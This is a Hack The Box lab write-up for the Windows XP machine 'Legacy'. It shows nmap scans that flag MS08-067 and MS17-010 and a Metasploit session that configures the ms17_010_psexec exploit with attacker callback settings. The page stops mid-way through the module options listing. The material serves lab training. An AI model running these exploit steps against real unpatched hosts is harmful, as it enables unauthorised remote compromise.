<!doctype html><html lang=en>
<head>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="ie=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=author content="[map[name:MindYourPrivacy]]">
<meta name=description content="Eternal-Blue vulnerability on SMB protocol with metasploit">
<meta name=keywords content=",smb,Eternal-Blue,metasploit">
<meta name=robots content="noodp">
<meta name=theme-color content>
<link rel=canonical href=https://0xade1.github.io/posts/2020/04/htb-legacy/>
<title>
HTB - Legacy :: Poney Island — Welcome to Pwnie Island
</title>
<link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css>
<link rel=stylesheet href=https://0xade1.github.io/main.d5b952c3b0131e8ecd6d80f97c5fae89d216a2c29dfa0754010b808bdb098871.css>
<link rel=apple-touch-icon sizes=180x180 href=https://0xade1.github.io/apple-touch-icon.png>
<link rel=icon type=image/png sizes=32x32 href=https://0xade1.github.io/favicon-32x32.png>
<link rel=icon type=image/png sizes=16x16 href=https://0xade1.github.io/favicon-16x16.png>
<link rel=manifest href=https://0xade1.github.io/site.webmanifest>
<link rel=mask-icon href=https://0xade1.github.io/safari-pinned-tab.svg color=#1b1c1d>
<link rel="shortcut icon" href=https://0xade1.github.io/favicon.ico>
<meta name=msapplication-TileColor content="#1b1c1d">
<meta name=theme-color content="#1b1c1d">
<meta itemprop=name content="HTB - Legacy">
<meta itemprop=description content="Eternal-Blue vulnerability on SMB protocol with metasploit"><meta itemprop=datePublished content="2020-04-11T00:54:12+08:00">
<meta itemprop=dateModified content="2020-04-11T00:54:12+08:00">
<meta itemprop=wordCount content="1321"><meta itemprop=image content="https://0xade1.github.io">
<meta itemprop=keywords content="smb,Eternal-Blue,metasploit,">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://0xade1.github.io">
<meta name=twitter:title content="HTB - Legacy">
<meta name=twitter:description content="Eternal-Blue vulnerability on SMB protocol with metasploit">
<meta property="og:title" content="HTB - Legacy">
<meta property="og:description" content="Eternal-Blue vulnerability on SMB protocol with metasploit">
<meta property="og:type" content="article">
<meta property="og:url" content="https://0xade1.github.io/posts/2020/04/htb-legacy/"><meta property="og:image" content="https://0xade1.github.io"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2020-04-11T00:54:12+08:00">
<meta property="article:modified_time" content="2020-04-11T00:54:12+08:00">
<meta property="og:see_also" content="https://0xade1.github.io/posts/2021/09/htb-crossfittwo/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2021/09/htb-knife/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2020/09/htb-shocker/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2020/09/htb-buff/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2020/09/htb-admirer/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2020/09/htb-sense/">
<meta property="article:section" content="htb windows">
<meta property="article:published_time" content="2020-04-11 00:54:12 +0800 +0800">
</head>
<body>
<div class=container>
<header class=header>
<span class=header__inner>
<a href=https://0xade1.github.io/ style=text-decoration:none>
<div class=logo>
<span class=logo__mark>></span>
<span class=logo__text># cd /root/</span>
<span class=logo__cursor>
</span>
</div>
</a>
<span class=header__right>
<nav class=menu>
<ul class=menu__inner><li><a href=https://0xade1.github.io/about/>About</a></li><li><a href=https://0xade1.github.io/categories/>Categories</a></li><li><a href=https://0xade1.github.io/posts/>Posts</a></li><li><a href=https://0xade1.github.io/series/>Series</a></li><li><a href=https://0xade1.github.io/tags/>Tags</a></li>
</ul>
</nav>
<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span>
</span>
</span>
</header>
<div class=content>
<main class=post>
<div class=post-info><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" ecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
2020-04-10
|<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
<span class=tag><a href=https://0xade1.github.io/categories/htb-windows/>htb windows</a></span>
|
|<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
<span class=tag><a href=https://0xade1.github.io/series/htb/>htb</a></span>
|
</div>
<article>
<h1 class=post-title>
<a href=https://0xade1.github.io/posts/2020/04/htb-legacy/>HTB - Legacy</a>
</h1>
<div class=post-info>
<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg>
<span class=tag><a href=https://0xade1.github.io/tags/smb/>smb</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/eternal-blue/>Eternal-Blue</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/metasploit/>metasploit</a></span>
</p>
</div>
<div class=post-excerpt>Eternal-Blue vulnerability on SMB protocol with metasploit</div>
<figure class=post-cover>
<img src=https://www.hackthebox.eu/images/logo-htb.svg alt="HTB - Legacy">
</figure>
<div class=post-content>
<h1 id=reconnaissance>Reconnaissance</h1>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>
<span style=color:#6272a4># Nmap 7.60 scan initiated Fri Feb 21 02:26:34 2020 as: nmap -Pn -sC -sV -oA nmap/legacy 10.10.10.4</span>
Nmap scan report <span style=color:#ff79c6>for</span> 10.10.10.4
Host is up <span style=color:#ff79c6>(</span>0.24s latency<span style=color:#ff79c6>)</span>.
Not shown: <span style=color:#bd93f9>997</span> filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d01h59m29s, deviation: 0s, median: 5d01h59m29s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:65:1e <span style=color:#ff79c6>(</span>VMware<span style=color:#ff79c6>)</span>
| smb-os-discovery:
|   OS: Windows XP <span style=color:#ff79c6>(</span>Windows <span style=color:#bd93f9>2000</span> LAN Manager<span style=color:#ff79c6>)</span>
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY<span style=color:#f1fa8c>\x</span><span style=color:#bd93f9>00</span>
|   Workgroup: HTB<span style=color:#f1fa8c>\x</span><span style=color:#bd93f9>00</span>
|_  System time: 2020-02-26T06:27:07+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span style=color:#ff79c6>(</span>dangerous, but default<span style=color:#ff79c6>)</span>
|_smb2-time: Protocol negotiation failed <span style=color:#ff79c6>(</span>SMB2<span style=color:#ff79c6>)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style=color:#6272a4># Nmap done at Fri Feb 21 02:31:48 2020 -- 1 IP address (1 host up) scanned in 314.20 seconds</span>
</code></pre></td></tr></table>
</div>
</div><p>port 445 is open and detected OS is Microsoft XP which is not receiving security updates for many years and therefore likely vulnerable to Eternal Blue attack used by Wannacry ransomware.</p>
<p>Best approach would be to attempt some very common exploit on SMB protocol which are available on Metasploit framework.</p>
<p>We can further assess SMB vulnerability on port 445 with nmap</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#6272a4># Nmap 7.60 scan initiated Fri Feb 21 02:54:35 2020 as: nmap --script=vuln -oA nmap/legacy-smb-vulns -p445 -Pn 10.10.10.4</span>
Nmap scan report <span style=color:#ff79c6>for</span> 10.10.10.4
Host is up <span style=color:#ff79c6>(</span>0.29s latency<span style=color:#ff79c6>)</span>.

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution <span style=color:#ff79c6>(</span>MS08-067<span style=color:#ff79c6>)</span>
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows <span style=color:#bd93f9>2000</span> SP4, XP SP2 and SP3, Server <span style=color:#bd93f9>2003</span> SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and <span style=color:#bd93f9>7</span> Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style=color:#ff79c6>=</span>CVE-2008-4250
|_smb-vuln-ms10-054: <span style=color:#8be9fd;font-style:italic>false</span>
|_smb-vuln-ms10-061: ERROR: Script execution failed <span style=color:#ff79c6>(</span>use -d to debug<span style=color:#ff79c6>)</span>
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers <span style=color:#ff79c6>(</span>ms17-010<span style=color:#ff79c6>)</span>
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers <span style=color:#ff79c6>(</span>ms17-010<span style=color:#ff79c6>)</span>.
|
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style=color:#ff79c6>=</span>CVE-2017-0143

<span style=color:#6272a4># Nmap done at Fri Feb 21 02:54:54 2020 -- 1 IP address (1 host up) scanned in 19.11 seconds</span>
</code></pre></td></tr></table>
</div>
</div><p>Two major vulnerabilities are identified: MS17-010 and MS08-067</p>
<p>The most recent being 2017, there should be no patch for Windows XP due to end of support</p>
<h1 id=exploitation>Exploitation</h1>
<h2 id=metasploit>Metasploit</h2>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">  9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 31
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 32
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 33
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 34
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 35
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 36
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 37
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 38
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 39
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 40
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 41
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 42
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 43
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 44
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 45
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 46
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 47
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 48
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 49
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 50
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 51
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 52
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 53
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 54
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 55
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 56
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 57
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 58
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 59
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 60
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 61
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 62
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 63
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 64
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 65
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 66
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 67
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 68
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 69
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 70
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 71
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 72
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 73
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 74
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 75
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 76
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 77
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 78
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 79
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 80
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 81
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 82
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 83
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 84
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 85
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 86
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 87
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 88
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 89
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 90
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 91
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 92
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 93
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 94
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 95
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 96
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 97
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 98
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 99
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">100
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">101
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">102
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">103
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">104
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">105
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">106
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">107
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">108
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">109
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">110
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">111
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">112
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">113
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">114
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">115
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">116
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">117
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">118
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">119
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">120
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">121
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">122
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>msfconsole -q

msf5 &gt; show search ms17_010

Matching <span style=color:#8be9fd;font-style:italic>Modules</span>
<span style=color:#ff79c6>================</span>

   <span style=color:#6272a4>#  Name                                           Disclosure Date  Rank     Check  Description</span>
   -  ----                                           ---------------  ----     -----  -----------
   <span style=color:#bd93f9>0</span>  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   <span style=color:#bd93f9>1</span>  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   <span style=color:#bd93f9>2</span>  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   <span style=color:#bd93f9>3</span>  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption <span style=color:#ff79c6>for</span> Win8+
   <span style=color:#bd93f9>4</span>  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution


msf5 &gt; use exploit/windows/smb/ms17_010_psexec
msf5 exploit<span style=color:#ff79c6>(</span>windows/smb/ms17_010_psexec<span style=color:#ff79c6>)</span> &gt; <span style=color:#8be9fd;font-style:italic>set</span> LPORT <span style=color:#bd93f9>8000</span>
<span style=color:#8be9fd;font-style:italic>LPORT</span> <span style=color:#ff79c6>=</span>&gt; <span style=color:#bd93f9>8000</span>
msf5 exploit<span style=color:#ff79c6>(</span>windows/smb/ms17_010_psexec<span style=color:#ff79c6>)</span> &gt; <span style=color:#8be9fd;font-style:italic>set</span> LHOST 10.10.14.36
<span style=color:#8be9fd;font-style:italic>LHOST</span> <span style=color:#ff79c6>=</span>&gt; 10.10.14.36
msf5 exploit<span style=color:#ff79c6>(</span>windows/smb/ms17_010_psexec<span style=color:#ff79c6>)</span> &gt; <span style=color:#8be9fd;font-style:italic>set</span> RHOSTS 10.10.10.4
<span style=color:#8be9fd;font-style:italic>RHOSTS</span> <span style=color:#ff79c6>=</span>&gt; 10.10.10.4
msf5 exploit<span style=color:#ff79c6>(</span>windows/smb/ms17_010_psexec<span style=color:#ff79c6>)</span> &gt; show options

Module options <span style=color:#ff79c6>(</span>exploit/windows/smb/ms17_010_psexec<span style=color:#ff79c6>)</span>:

   Name                  Current Setting                                                              Required  Description
   ----                  ---------------                                                              --------  -----------
   DBGTRACE              <span style=color:#8be9fd;font-style:italic>false</span>                                                                        yes       Show extra debug trace info
